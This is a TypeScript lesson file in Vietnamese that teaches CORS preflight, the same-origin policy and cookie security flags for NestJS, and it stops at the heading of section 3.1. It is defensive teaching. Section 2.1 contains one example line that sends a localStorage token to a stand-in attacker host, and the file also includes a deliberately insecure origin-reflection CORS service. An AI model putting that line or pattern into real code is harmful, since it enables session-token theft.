import type { Lesson } from '../types.ts';

export const c3_l3: Lesson = {
  id: 'c3-l3',
  title: 'Bài 03: Web Security Network Layer: CORS Preflight Protocol, Cookie Security Flag (SameSite/HttpOnly/Secure)',
  duration: '60 phút',
  tag: 'Web Security & Headers',
  theory: `
> **Mục tiêu học thuật & Chuẩn đầu ra của bài học:**
> Bài học này trang bị nền tảng An ninh Tầng Mạng Ứng dụng Web (Web Network Security Architecture) từ cơ chế Cô lập Nguồn gốc trong Nhân Trình duyệt (Browser Same-Origin Policy Sandbox) đến kiến trúc Bảo vệ Phiên Xác thực bằng Cờ Cookie và Tiêu đề Bảo mật HTTP cho kỹ sư Backend thông qua 3 trục kiến thức cốt lõi:
> 1. **Chính sách Cùng Nguồn gốc (\`Same-Origin Policy — SOP\`), Giao thức Thăm dò Trước (\`CORS Preflight OPTIONS\`) và Lỗ hổng Đầu độc Bộ đệm (\`Vary: Origin\`):** Hiểu rõ định nghĩa toán học của bộ ba \`Origin = (Scheme, Host, Port)\`; phân biệt rạch ròi vai trò của CORS (cơ chế trình duyệt bảo vệ người dùng, hoàn toàn không phải tường lửa bảo vệ máy chủ trước \`cURL/Postman\`); giải thích điều kiện kích hoạt \`Preflight OPTIONS\`, tại sao cấm dùng \`Access-Control-Allow-Origin: *\` khi bật \`Credentials: true\`, và nguy cơ lộ dữ liệu chéo nếu thiếu tiêu đề \`Vary: Origin\`.
> 2. **Kiến trúc Lưu trữ Phiên Xác thực: Phản mẫu \`localStorage\` trước tấn công \`XSS\` và Phòng thủ Chiều sâu với Bộ ba Cờ Cookie (\`HttpOnly\`, \`Secure\`, \`SameSite\`) kèm Tiền tố \`__Host-\`:** Phân tích định lượng bề mặt tấn công đánh cắp Token qua \`Cross-Site Scripting (XSS)\` và giả mạo yêu cầu liên trang (\`CSRF — Cross-Site Request Forgery\`); nắm vững sự khác biệt hành vi giữa \`SameSite=Strict\`, \`SameSite=Lax\` và \`SameSite=None\`, cũng như cách tiền tố **\`__Host-\`** chặn đứng tấn công **Ghi đè Cookie từ Tên miền Phụ (\`Subdomain Cookie Tossing\`)**.
> 3. **Gia cố Tầng Giao vận bằng Hệ thống Tiêu đề Bảo mật HTTP (\`HSTS\`, \`CSP\`, \`X-Content-Type-Options\`) trong NestJS và Chẩn đoán Sự cố Production:** Triển khai \`Helmet\` và \`Dynamic CORS Whitelist\` đạt chuẩn OWASP ASVS Level 2; nắm vững cơ chế chống hạ cấp giao thức **\`SSL Stripping\`** thông qua danh sách nạp cứng **\`HSTS Preload\`** và phương pháp chẩn đoán lỗi chặn CORS/Cookie trên môi trường thực tế.

---

# 1. CHÍNH SÁCH CÙNG NGUỒN GỐC (SAME-ORIGIN POLICY) VÀ GIAO THỨC THĂM DÒ TRƯỚC CORS PREFLIGHT (OPTIONS)

### 1.1 Khái niệm nền tảng: Định nghĩa Bộ ba Origin (Scheme, Host, Port), Ranh giới Bảo mật SOP và Bản chất Thực sự của CORS

Trong kiến trúc bảo mật Web hiện đại, trình duyệt của người dùng là một môi trường thực thi đa bên cực kỳ nguy hiểm: Tab thứ nhất của người dùng đang đăng nhập vào hệ thống ngân hàng \`https://banking.vn\` (có lưu sẵn \`Session Cookie\` trong bộ nhớ trình duyệt), đồng thời ở Tab thứ hai người dùng vô tình mở một trang web đọc truyện hoặc quảng cáo độc hại \`https://evil-tracker.org\`.

Nếu không có một bức tường lửa cô lập ngay bên trong nhân trình duyệt, đoạn mã JavaScript chạy trên \`evil-tracker.org\` có thể dễ dàng gọi \`fetch('https://banking.vn/api/v1/account-balance', { credentials: 'include' })\` để đọc trộm toàn bộ số dư và lịch sử giao dịch của nạn nhân! Cơ chế nền tảng ngăn chặn thảm họa này chính là **Chính sách Cùng Nguồn gốc (\`Same-Origin Policy — SOP\`, chuẩn RFC 6454)**:

1. **Định nghĩa Toán học của một \`Origin\` (\`3-Tuple Identity\`):**
   Hai địa chỉ URL chỉ được nhân trình duyệt coi là **Cùng Nguồn gốc (\`Same-Origin\`)** khi và chỉ khi cả **3 thành phần** trong bộ ba \`(Scheme / Protocol, Hostname / Domain, Port)\` khớp nhau tuyệt đối từng ký tự:
   - So với nguồn gốc chuẩn \`https://app.arc-irobot.tech:443\`:
     + \`http://app.arc-irobot.tech:80\` $\rightarrow$ **Khác Origin (\`Cross-Origin\`)** vì khác giao thức (\`http\` $\ne$ \`https\`) và khác cổng (\`80\` $\ne$ \`443\`).
     + \`https://api.arc-irobot.tech:443\` $\rightarrow$ **Khác Origin (\`Cross-Origin\`)** vì khác tên miền phụ (\`api\` $\ne$ \`app\`).
     + \`https://app.arc-irobot.tech:8443\` $\rightarrow$ **Khác Origin (\`Cross-Origin\`)** vì khác cổng TCP (\`8443\` $\ne$ \`443\`).
2. **Sự thật cốt lõi về \`CORS (Cross-Origin Resource Sharing)\` — Bảo vệ Trình duyệt, KHÔNG phải Tường lửa Bảo vệ Máy chủ:**
   Một trong những ngộ nhận tai hại nhất của lập trình viên Backend là nghĩ rằng *"Cấu hình CORS trên NestJS sẽ giúp chặn Hacker gọi vào API của mình"*.
   - **Sự thật kỹ thuật:** Chính sách \`SOP\` và \`CORS\` chỉ được cưỡng chế thực thi bởi **Các Trình duyệt Web chuẩn (\`Browser Engines\` như Chromium/Blink, WebKit, Gecko)**.
   - Khi kẻ tấn công sử dụng công cụ dòng lệnh như **\`cURL\`**, **\`Postman\`**, tập lệnh **\`Python / Node.js\`** hoặc một máy chủ Backend khác để bắn HTTP Request trực tiếp vào API của bạn, các công cụ đó **hoàn toàn không kiểm tra CORS** và có thể giả mạo tiêu đề \`Origin: https://app.arc-irobot.tech\` dễ dàng trong 1 dòng lệnh!
   - **Vậy bản chất của CORS là gì?** Khi ứng dụng Frontend (\`https://app.arc-irobot.tech\`) và Backend API (\`https://api.arc-irobot.tech\`) được triển khai trên hai tên miền phụ khác nhau, mặc định \`SOP\` sẽ chặn không cho mã JavaScript trên \`app\` đọc kết quả trả về từ \`api\`. Giao thức **\`CORS (W3C Fetch Standard)\`** là cơ chế để máy chủ \`api\` gửi các tiêu đề HTTP đặc biệt (\`Access-Control-Allow-*\`) báo cho **trình duyệt của người dùng hợp lệ** biết rằng: *"Nguồn gốc \`https://app.arc-irobot.tech\` là người nhà của tôi, hãy mở khóa cho phép mã JavaScript của trang đó đọc nội dung HTTP Response này!"*.

### 1.2 Phân loại Yêu cầu Đơn giản (Simple Request) và Yêu cầu Cần Thăm dò Trước (Preflighted Request) theo Chuẩn W3C Fetch

Một chi tiết kỹ thuật cực kỳ quan trọng mà mọi kỹ sư Backend phải nắm vững: Đối với các **Yêu cầu Đơn giản (\`Simple Requests\` — tương đương với hành vi gửi thẻ \`<form>\` hoặc tải ảnh \`<img>\` từ thời Web 1.0)**, trình duyệt **VẪN GỬI THẲNG yêu cầu đó tới máy chủ và máy chủ VẪN THỰC THI code trong Controller**, sau đó khi kết quả trả về tới trình duyệt, nếu thiếu tiêu đề \`Access-Control-Allow-Origin\` thì trình duyệt mới ẩn kết quả đó đi không cho JavaScript đọc!

Ngược lại, nếu yêu cầu sử dụng các tính năng hiện đại (như gửi dữ liệu định dạng \`application/json\`, dùng phương thức \`PUT / DELETE / PATCH\`, hoặc đính kèm tiêu đề \`Authorization\`), nếu trình duyệt cứ gửi thẳng lên máy chủ thì máy chủ (vốn có thể chỉ viết cho Web 1.0 cũ) sẽ bị xóa mất dữ liệu trước khi trình duyệt kịp chặn! Vì vậy, với các yêu cầu không đơn giản, trình duyệt bắt buộc phải gửi một gói tin hỏi đường trước gọi là **Yêu cầu Thăm dò Trước (\`CORS Preflight Request\` sử dụng phương thức \`HTTP OPTIONS\`)**.

Bảng dưới đây đối chiếu rạch ròi điều kiện phân loại và hành vi mạng của hai nhóm yêu cầu này:

| Tiêu chí Kỹ thuật (Theo W3C Fetch Spec) | 1. Yêu cầu Đơn giản (\`CORS Simple Request\`) | 2. Yêu cầu Cần Thăm dò Trước (\`Preflighted Request\`) |
| :--- | :--- | :--- |
| **Phương thức HTTP (\`HTTP Methods\`)** | Chỉ được phép là 1 trong 3 phương thức: **\`GET\`**, **\`HEAD\`**, hoặc **\`POST\`** | Bất kỳ phương thức nào khác: **\`PUT\`**, **\`DELETE\`**, **\`PATCH\`**, hoặc khi có điều kiện bên dưới |
| **Tiêu đề Tùy chỉnh (\`Request Headers\`)** | Chỉ gồm các tiêu đề an toàn mặc định (\`Accept\`, \`Accept-Language\`, \`Content-Language\`, \`Content-Type\`) | Có đính kèm bất kỳ tiêu đề tùy chỉnh nào: **\`Authorization\`**, **\`x-idempotency-key\`**, **\`x-api-key\`**, **\`x-tenant-id\`** |
| **Giá trị của \`Content-Type\` được phép** | Chỉ gồm 3 kiểu cổ điển: \`text/plain\`, \`multipart/form-data\`, hoặc \`application/x-www-form-urlencoded\` | **\`application/json\`**, \`application/xml\`, \`application/octet-stream\` (**99% API REST hiện đại đều rơi vào nhóm này!**) |
| **Số vòng lặp HTTP trên đường truyền** | **\`1 Request duy nhất\`**: Gửi thẳng lệnh thực tế kèm tiêu đề \`Origin\` lên máy chủ ngay lập tức | **\`2 Requests tuần tự\`**: Gửi gói thăm dò \`OPTIONS\` (chờ \`204 No Content\`), nếu hợp lệ mới gửi lệnh thực tế (hoặc \`1 Request\` nếu đã Cache \`Max-Age\`) |
| **Thời điểm Trình duyệt Chặn (\`Blocking Point\`)** | Chặn **SAU KHI** máy chủ đã thực thi xong và trả Response về (Nguy cơ bị tấn công **\`CSRF\`** nếu dùng Cookie!) | Chặn **TRƯỚC KHI** gửi lệnh thực tế: Nếu bước \`OPTIONS\` bị từ chối, lệnh \`DELETE / POST JSON\` thật **không bao giờ được gửi đi**! |

### 1.3 Giải phẫu Giao thức Bắt tay CORS Preflight (\`OPTIONS\`), Lỗ hổng Phản chiếu Origin Mù quáng (\`Origin Reflection\`) và Vai trò Sống còn của \`Vary: Origin\`

Khi thiết kế cơ chế kiểm duyệt CORS cho hệ thống đa tên miền (ví dụ cho phép cả \`https://app.arc-irobot.tech\` và \`https://admin.arc-irobot.tech\` cùng gửi Cookie xác thực \`credentials: true\`), lập trình viên thường mắc phải 3 sai lầm chết người:

1. **Sai lầm 1 — Cố dùng Ký tự Đại diện \`*\` kết hợp với \`Credentials: true\`:**
   Theo chuẩn W3C CORS, khi máy khách gửi yêu cầu có kèm thông tin định danh (\`fetch(url, { credentials: 'include' })\` hoặc \`axios.defaults.withCredentials = true\`), trình duyệt **nghiêm cấm** máy chủ trả về \`Access-Control-Allow-Origin: *\` (hoặc \`Access-Control-Allow-Headers: *\`). Nếu máy chủ trả về dấu \`*\`, trình duyệt lập tức hủy bỏ kết quả với lỗi \`CORS Credential Wildcard Error\`, bởi nếu cho phép \`*\` đi cùng Cookie thì mọi trang web độc hại trên toàn cầu đều có thể đọc trộm dữ liệu phiên đăng nhập của người dùng!
2. **Sai lầm 2 — Lỗ hổng Phản chiếu Nguồn gốc Mù quáng (\`Blind Origin Reflection — origin: true\`):**
   Để vượt qua lỗi chặn dấu \`*\` ở trên một cách lười biếng, nhiều lập trình viên cấu hình \`app.enableCors({ origin: true, credentials: true })\` (tức là máy khách gửi \`Origin\` nào lên thì máy chủ copy nguyên xi chuỗi đó trả về trong \`Access-Control-Allow-Origin\`). **Đây là lỗ hổng bảo mật cấp độ Nghiêm trọng (Critical Severity)**, nguy hiểm hơn cả dấu \`*\` vì nó vừa vượt qua rào chắn của trình duyệt vừa cho phép mọi tên miền của Hacker gửi kèm Cookie và đọc toàn bộ dữ liệu nhạy cảm!
3. **Sai lầm 3 — Thiếu tiêu đề \`Vary: Origin\` gây Đầu độc Bộ nhớ Đệm CDN (\`CORS Cache Poisoning\`):**
   Khi máy chủ NestJS kiểm tra \`req.headers.origin\` nằm trong danh sách cho phép (\`Whitelist\`) và trả về động đúng tên miền đó (ví dụ \`Access-Control-Allow-Origin: https://app.arc-irobot.tech\`), nếu ở phía trước máy chủ có lớp đệm **CDN (Cloudflare, AWS CloudFront) hoặc Shared Proxy Cache** mà máy chủ quên đính kèm tiêu đề **\`Vary: Origin\`**, CDN sẽ lưu bộ đệm phản hồi đó cho đường dẫn URL chung! Ngay sau đó, khi quản trị viên từ trang \`https://admin.arc-irobot.tech\` gọi tới cùng URL đó, CDN sẽ trả về bản cache cũ mang tiêu đề \`Allow-Origin: https://app.arc-irobot.tech\` $\rightarrow$ Trình duyệt của trang Admin thấy không khớp tên miền liền chặn đứng với lỗi CORS!

Hãy đối chiếu hai thiết kế kiểm duyệt CORS trong NestJS dưới đây để thấy cách phòng chống triệt để cả 3 sai lầm trên:

\`\`\`typescript
// File: src/modules/security/cors-origin-validator.service.ts
// 1. THIẾT KẾ SAI (ANTI-PATTERN): Phản chiếu mù quáng mọi Origin (origin: true) và thiếu Vary Header
import { Injectable } from '@nestjs/common';

@Injectable()
export class BlindReflectionCorsBrokenService {
  buildInsecureCorsHeaders(requestOrigin: string | undefined): Record<string, string> {
    // LỖI BẢO MẬT CHÍ MẠNG (BLIND ORIGIN REFLECTION):
    // Phản chiếu lại bất kỳ Origin nào mà trình duyệt gửi lên kết hợp với Allow-Credentials: true!
    // Khi người dùng vào trang web độc hại https://evil-phishing.com, trang đó gọi ngầm tới API này,
    // hàm dưới đây sẽ trả về Access-Control-Allow-Origin: https://evil-phishing.com kèm Credentials,
    // mở toang cửa cho kẻ tấn công đọc sạch dữ liệu tài khoản của nạn nhân!
    return {
      'Access-Control-Allow-Origin': requestOrigin || '*',
      'Access-Control-Allow-Credentials': 'true',
    };
  }
}

// 2. THIẾT KẾ CHUẨN (PRODUCTION WHITELIST + VARY HEADER + PREFLIGHT CACHE):
@Injectable()
export class StrictWhitelistCorsSafeService {
  private readonly allowedOrigins = new Set<string>([
    'https://app.arc-irobot.tech',
    'https://admin.arc-irobot.tech',
  ]);

  buildSecureCorsHeaders(requestOrigin: string | undefined): {
    allowed: boolean;
    headers: Record<string, string>;
  } {
    // Luôn đính kèm Vary: Origin để CDN/Browser Cache phân tách bộ đệm theo từng nguồn gốc,
    // ngăn chặn hoàn toàn lỗi Đầu độc Bộ nhớ Đệm (CORS Cache Poisoning) giữa app và admin!
    const baseHeaders: Record<string, string> = {
      Vary: 'Origin',
    };

    if (!requestOrigin || !this.allowedOrigins.has(requestOrigin)) {
      return { allowed: false, headers: baseHeaders };
    }

    return {
      allowed: true,
      headers: {
        ...baseHeaders,
        'Access-Control-Allow-Origin': requestOrigin,
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, PATCH, DELETE, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Idempotency-Key',
        'Access-Control-Max-Age': '86400',
      },
    };
  }
}
\`\`\`

Để quan sát tác động của gói tin \`Preflight OPTIONS\` lên độ trễ đường truyền (giả sử \`1 RTT = 40 ms\`, thời gian xử lý API là \`15 ms\`) và hiệu quả của bộ đệm **\`Access-Control-Max-Age: 86400\`**, hãy theo dõi bảng truy vết thực thi theo từng mốc mili-giây dưới đây:

| Mốc thời gian | Chặng Giao tiếp Mạng | Thao tác của Trình duyệt & Máy chủ NestJS | Trạng thái Bộ đệm Preflight của Trình duyệt | Độ trễ Tích lũy của Lệnh API |
| :--- | :--- | :--- | :--- | :--- |
| **\`t = 0 ms\`** | **Lần gọi #1 (Khởi phát)** | Frontend gọi \`POST /api/orders\` với \`Content-Type: application/json\` | Bộ đệm \`Preflight Cache\` đang trống (\`MISS\`); trình duyệt giữ lại lệnh \`POST\` | \`0 ms\` (Lệnh \`POST\` chưa được gửi) |
| **\`t = 0.5 ms\`** | **Lần gọi #1 (Gửi OPTIONS)** | Trình duyệt tự động phát gói thăm dò \`OPTIONS /api/orders\` ra mạng | Đang chờ phản hồi thẩm định quyền truy cập từ máy chủ | Đang chạy vòng lặp mạng thứ nhất |
| **\`t = 40 ms\`** | **Lần gọi #1 (Nhận OPTIONS)** | Máy chủ trả về \`204 No Content\` kèm \`Allow-Origin\` và \`Max-Age: 86400\` | Trình duyệt ghi nhận quyền hợp lệ vào \`Preflight Cache\` trong suốt **\`24 giờ\`** | Đã tiêu tốn **\`40 ms (1 RTT)\`** cho Preflight |
| **\`t = 41 ms\`** | **Lần gọi #1 (Gửi POST thật)** | Trình duyệt giải phóng và gửi gói tin \`POST /api/orders\` kèm JSON Body đi | Đã xác thực xong quyền Cross-Origin | Bắt đầu truyền tải dữ liệu nghiệp vụ |
| **\`t = 96 ms\`** | **Lần gọi #1 (Hoàn tất)** | Tốn \`40 ms\` mạng + \`15 ms\` xử lý DB; trình duyệt nhận \`201 Created\` | Hợp lệ (Khớp \`Allow-Origin\`), bàn giao dữ liệu cho hàm \`await fetch()\` | Tổng Lần gọi #1 = **\`96 ms\`** |
| **\`t = 5,000 ms\`** | **Lần gọi #2 (Có \`Max-Age\`)** | Người dùng gọi tiếp \`POST /api/orders\`; trình duyệt tra cứu thấy **\`Cache HIT\`** | **Bỏ qua hoàn toàn bước \`OPTIONS\`**, bắn thẳng gói \`POST\` ngay lập tức! | Tổng Lần gọi #2 chỉ còn **\`55 ms\` (Giảm 42.7%!)** |

### 1.4 Định lượng Chi phí Độ trễ Preflight OPTIONS (RTT Overhead) và Công thức Tính Tỷ lệ Giảm tải Nhờ Bộ đệm \`Max-Age\`

Kỹ sư có thể định lượng trực tiếp chi phí thời gian mạng bị lãng phí nếu quên cấu hình tiêu đề \`Access-Control-Max-Age\` thông qua hệ công thức sau:

\`\`\`
Tổng độ trễ của 1 yêu cầu Cross-Origin khi KHÔNG có Preflight Cache (T_unbuffered_ms) = RTT_Preflight_Ms + RTT_Actual_Request_Ms + T_Server_Processing_Ms
Tổng độ trễ khi ĐÃ CÓ Preflight Cache (T_cached_ms) = RTT_Actual_Request_Ms + T_Server_Processing_Ms
Thời gian mạng tiết kiệm được cho N yêu cầu liên tiếp trong cửa sổ Max-Age (Saved_Time_Ms) = (N - 1) × RTT_Preflight_Ms
Ví dụ định lượng: Trong 1 phiên làm việc người dùng thực hiện N = 25 thao tác gọi API JSON qua mạng 4G có RTT = 60 ms:
-> Nếu không đặt Access-Control-Max-Age: Tốn thêm 25 × 60 = 1,500 ms (1.5 giây chờ đợi vô ích!)
-> Nếu đặt Access-Control-Max-Age = 86400 (24h): Chỉ tốn 1 lần OPTIONS đầu tiên (60 ms), tiết kiệm được 24 × 60 = 1,440 ms (96% chi phí thăm dò)!
\`\`\`

> **Tổng kết học thuật Phần 1 (Hai quy tắc cấu hình CORS trên Production):**
> 1. **Tuyệt đối không dùng \`origin: true\` hoặc \`*\` khi có \`credentials: true\`:** Luôn kiểm tra \`Origin\` dựa trên một tập hợp \`Set<string>\` được nạp từ biến môi trường và bắt buộc đính kèm tiêu đề **\`Vary: Origin\`** trong mọi phản hồi để chống lỗi đầu độc bộ đệm CDN.
> 2. **Luôn trả về \`204 No Content\` kèm \`Access-Control-Max-Age: 86400\` cho yêu cầu \`OPTIONS\`:** Giúp trình duyệt lưu đệm kết quả thẩm định quyền trong 24 giờ, cắt giảm một nửa số lượng gói tin HTTP gửi vào API Gateway.

---

# 2. KIẾN TRÚC BẢO MẬT PHIÊN ĐĂNG NHẬP: BỘ BA CỜ COOKIE (HTTPONLY, SECURE, SAMESITE) VÀ TIỀN TỐ __HOST-

### 2.1 Giải phẫu Bề mặt Tấn công Lưu trữ Token: Tại sao Lưu JWT trong \`localStorage\` là Phản mẫu Nguy hiểm trước XSS?

Khi thiết kế hệ thống xác thực người dùng (\`Authentication\`) cho ứng dụng Single-Page Application (React, Vue, Next.js, Angular), câu hỏi kiến trúc quan trọng bậc nhất là: **Nên lưu trữ \`Access Token\` và \`Refresh Token\` ở đâu tại phía trình duyệt?**

1. **Phản mẫu Lưu trữ Token trong \`window.localStorage\` hoặc \`sessionStorage\`:**
   Nhiều hướng dẫn cơ bản khuyên lập trình viên lưu chuỗi JWT vào \`localStorage.setItem('access_token', jwt)\` vì sự tiện lợi khi lấy ra gắn vào tiêu đề \`Authorization: Bearer <jwt>\`.
   - **Điểm yếu chí mạng:** Toàn bộ kho \`localStorage\` nằm hoàn toàn trong không gian bộ nhớ có thể truy cập tự do bởi **bất kỳ đoạn mã JavaScript nào đang chạy trên cùng \`Origin\` đó**.
   - Trong một dự án Frontend thực tế sử dụng từ \`500\` đến \`1,500\` gói thư viện \`npm\` bên thứ ba (hoặc nhúng các đoạn script phân tích lưu lượng, khung chat hỗ trợ khách hàng, trình hiển thị Markdown/HTML), chỉ cần **một lỗ hổng Tiêm Mã Kịch bản Liên trang (\`XSS — Cross-Site Scripting\`)** hoặc **Tấn công Chuỗi Cung ứng (\`Supply-Chain Attack\`)** xảy ra ở bất kỳ thư viện phụ nào, kẻ tấn công chỉ cần thực thi đúng 1 dòng lệnh:
     \`fetch('https://attacker.io/steal?t=' + localStorage.getItem('access_token'))\`
     là toàn bộ tài khoản của người dùng đã bị chiếm đoạt hoàn toàn mà không có cách nào ngăn cản!
2. **Giải pháp Chuẩn Công nghiệp: Cô lập Token khỏi JavaScript bằng \`HttpOnly Cookie\` kết hợp Lưu \`Access Token\` ngắn hạn trong RAM:**
   Khi máy chủ NestJS đính kèm chuỗi Token (đặc biệt là \`Refresh Token\` hoặc \`Session ID\`) thông qua tiêu đề phản hồi **\`Set-Cookie\`** có bật cờ **\`HttpOnly\`**, trình duyệt sẽ cất giữ Cookie đó vào một kho dữ liệu nội bộ cấp nhân trình duyệt (\`Browser Network Process Cookie Jar\`).
   - Trình duyệt **cấm tuyệt đối** mọi truy cập đọc/ghi từ môi trường JavaScript (\`document.cookie\` trả về chuỗi rỗng!).
   - Nhờ đó, ngay cả khi trang web chẳng may bị dính lỗ hổng \`XSS\`, mã độc JavaScript của kẻ tấn công cũng **hoàn toàn mù tịt, không thể nào đọc hay trích xuất được giá trị \`Refresh Token\` thô** để mang về máy chủ của hacker!

### 2.2 Cơ chế Phòng thủ Chiều sâu của Bộ ba Cờ Cookie (\`HttpOnly\`, \`Secure\`, \`SameSite\`) và Tiền tố Bảo mật (\`__Host-\` / \`__Secure-\`)

Tuy nhiên, khi chuyển sang sử dụng Cookie, vì trình duyệt có cơ chế **tự động đính kèm Cookie vào mọi yêu cầu HTTP gửi tới tên miền đích**, chúng ta lại phải đối mặt với hai loại hình tấn công khác là **Giả mạo Yêu cầu Liên trang (\`CSRF — Cross-Site Request Forgery\`)** và **Ghi đè Cookie từ Tên miền Phụ (\`Subdomain Cookie Tossing\`)**. Để khóa chặt toàn diện các bề mặt tấn công này, chuẩn **\`RFC 6265bis\`** cung cấp **Bộ ba Cờ Bảo mật** cùng **Tiền tố Tên Cookie Cưỡng chế (\`Cookie Prefixes\`)**:

| Thuộc tính / Tiền tố Cookie | Cú pháp trong Tiêu đề \`Set-Cookie\` | Cơ chế Cưỡng chế của Nhân Trình duyệt | Loại Tấn công Bị Vô hiệu hóa Hoàn toàn |
| :--- | :--- | :--- | :--- |
| **1. Cờ \`HttpOnly\`** | \`HttpOnly\` | Chặn hoàn toàn API \`document.cookie\`, \`Web Workers\` và mọi mã JS đọc/sửa giá trị Cookie | **Đánh cắp Token qua \`XSS\` (\`Token Exfiltration\`)** |
| **2. Cờ \`Secure\`** | \`Secure\` | Chỉ cho phép truyền Cookie qua kênh đã mã hóa **\`HTTPS (TLS)\`**; từ chối gửi qua \`HTTP\` thường | **Nghe lén & Đánh cắp phiên trên đường truyền (\`MITM Sniffing\`)** |
| **3. \`SameSite=Strict\`** | \`SameSite=Strict\` | **Cấm tuyệt đối** gửi Cookie trong mọi yêu cầu xuất phát từ trang web khác (kể cả bấm link \`<a>\`) | **Chống \`CSRF\` 100%** (Dùng cho Ngân hàng, trang Quản trị tối mật) |
| **4. \`SameSite=Lax\`** | \`SameSite=Lax\` (Mặc định mới) | Chặn gửi Cookie ở các lệnh ngầm Cross-Site (\`POST form\`, \`fetch\`, \`iframe\`), nhưng **cho phép gửi khi người dùng bấm link điều hướng cấp cao nhất (\`Top-level GET Navigation\`)** | **Chống \`CSRF\` cho mọi phương thức đột biến (\`POST/PUT/DELETE\`)** mà vẫn giữ đăng nhập khi mở link từ Email/Zalo |
| **5. \`SameSite=None\`** | \`SameSite=None; Secure\` | Cho phép gửi Cookie trong mọi bối cảnh Cross-Site (nhúng \`iframe\` bên thứ ba); **bắt buộc phải đi kèm cờ \`Secure\`** | Không chống CSRF tự nhiên; bắt buộc phải tự cài đặt thêm **\`Anti-CSRF Token\`** |
| **6. Tiền tố \`__Host-\`** | \`__Host-refresh_token=...\` | Trình duyệt chỉ chấp nhận nếu thỏa mãn đủ 3 điều kiện: **(1) Có cờ \`Secure\`**, **(2) \`Path=/\`**, và **(3) KHÔNG có thuộc tính \`Domain\`** (Khóa chặt vào đúng tên miền hiện tại!) | **Chống Tấn công Ghi đè Cookie từ Subdomain (\`Subdomain Cookie Tossing / Fixation\`)** |

### 2.3 Phân tích Kịch bản Tấn công Giả mạo Yêu cầu Liên trang (CSRF) và Tại sao Tiền tố \`__Host-\` là Chuẩn mực Cao nhất?

1. **Cách \`SameSite=Lax / Strict\` tiêu diệt cuộc tấn công \`CSRF\` cổ điển:**
   Trong cuộc tấn công \`CSRF\`, kẻ tấn công tạo một trang web \`https://free-gift.org\` chứa một biểu mẫu ẩn \`<form action="https://banking.vn/api/transfer" method="POST">\` và tự động gọi \`form.submit()\` bằng JavaScript. Vì đây là một \`Simple Request\` (\`application/x-www-form-urlencoded\`), nó không kích hoạt \`CORS Preflight\`. Nếu Cookie của \`banking.vn\` không có cờ \`SameSite\`, trình duyệt sẽ ngoan ngoãn đính kèm Cookie phiên đăng nhập vào gói \`POST\` đó và làm người dùng mất tiền! Nhưng ngay khi bật **\`SameSite=Lax\`** hoặc **\`SameSite=Strict\`**, trình duyệt phát hiện gói \`POST\` xuất phát từ \`free-gift.org\` ($\ne$ \`banking.vn\`) nên **từ chối đính kèm Cookie**, làm cuộc tấn công thất bại ngay từ trong trứng nước!
2. **Tại sao cần thêm Tiền tố \`__Host-\` (Chống \`Subdomain Cookie Tossing\`)?**
   Giả sử công ty của bạn có trang chính \`https://app.company.com\` và hàng chục tên miền phụ cho các chiến dịch tiếp thị như \`https://promo-2026.company.com\`. Lưu ý rằng theo chuẩn Web, \`app.company.com\` và \`promo-2026.company.com\` được coi là **Cùng một Trang (\`Same-Site\` vì cùng thuộc tên miền gốc \`company.com\`)** dù chúng **Khác Nguồn gốc (\`Cross-Origin\`)**!
   - Nếu trang phụ \`promo-2026.company.com\` bị lỗ hổng hoặc trỏ nhầm DNS (\`Subdomain Takeover\`), kẻ tấn công đứng trên \`promo-2026.company.com\` có thể phát lệnh \`Set-Cookie: session_id=HACKER_TOKEN; Domain=.company.com\` để **ghi đè Cookie lên toàn bộ hệ thống chính \`app.company.com\`**!
   - Nhưng nếu máy chủ \`app.company.com\` đặt tên Cookie bắt đầu bằng tiền tố **\`__Host-session_id\`**, nhân trình duyệt sẽ **cấm tuyệt đối** thuộc tính \`Domain=.company.com\`! Không một tên miền phụ nào có thể giả mạo hay ghi đè được Cookie mang tiền tố \`__Host-\` của trang chính!

\`\`\`
Thời gian phơi nhiễm rủi ro của Access Token lưu trong RAM (Exposure_Window_Min) = Access_Token_TTL_Seconds / 60
Xác suất rò rỉ Refresh Token qua document.cookie khi bật HttpOnly (XSS_Cookie_Read_Probability) = 0 (Bằng không tuyệt đối)
Số điều kiện bắt buộc của tiền tố __Host- (Host_Prefix_Constraints) = 3 (Bắt buộc Secure=true + Path="/" + Không có thuộc tính Domain)
Ví dụ định lượng: Với kiến trúc Dual-Token chuẩn (Access Token lưu biến RAM có TTL = 300s [5 phút] + __Host-RefreshToken lưu HttpOnly Cookie có TTL = 7 ngày):
-> Ngay cả khi người dùng tải lại trang (F5), ứng dụng tự động gọi /auth/refresh qua HttpOnly Cookie để cấp lại Access Token mới trong 15 ms mà không bao giờ phải lưu bất kỳ ký tự nào vào localStorage!
\`\`\`

> **Tổng kết học thuật Phần 2 (Hai quy tắc thiết kế Lưu trữ Phiên Xác thực):**
> 1. **Kiến trúc Hai Token Chuẩn (\`In-Memory Access Token + __Host- HttpOnly Refresh Cookie\`):** Tuyệt đối không lưu bất kỳ Token nào vào \`localStorage\`. Hãy giữ \`Access Token\` (hạn ngắn \`5 – 15 phút\`) trong biến bộ nhớ JavaScript (\`React State / Closure Memory\`) và lưu \`Refresh Token\` trong Cookie đặt tên theo chuẩn **\`__Host-refresh_token\`** với đầy đủ bộ cờ \`HttpOnly; Secure; SameSite=Strict (hoặc Lax); Path=/\`.
> 2. **Kết hợp Phòng vệ Kép chống CSRF (\`Defense-in-Depth CSRF Protection\`):** Đối với các hệ thống yêu cầu độ an toàn cấp độ Ngân hàng hoặc khi bắt buộc phải mở \`SameSite=None\` cho giao tiếp liên tên miền, hãy kết hợp thêm tiêu đề tùy chỉnh (như \`X-Requested-With\` hoặc \`X-CSRF-Token\` theo mô hình **\`Double-Submit Cookie\`**) để ép mọi yêu cầu đột biến đều phải đi qua cổng kiểm duyệt \`CORS Preflight OPTIONS\`.

---

# 3. GIA CỐ TẦNG MẠNG VỚI HTTP SECURITY HEADERS (HSTS, CSP, X-CONTENT-TYPE-OPTIONS) VÀ CHẨN ĐOÁN PRODUCTION

### 3.1 Cơ chế Chống Hạ cấp Giao thức (\`SSL Stripping\`) bằng \`Strict-Transport-Security (HSTS)\` và Khóa Nội dung \`CSP\`

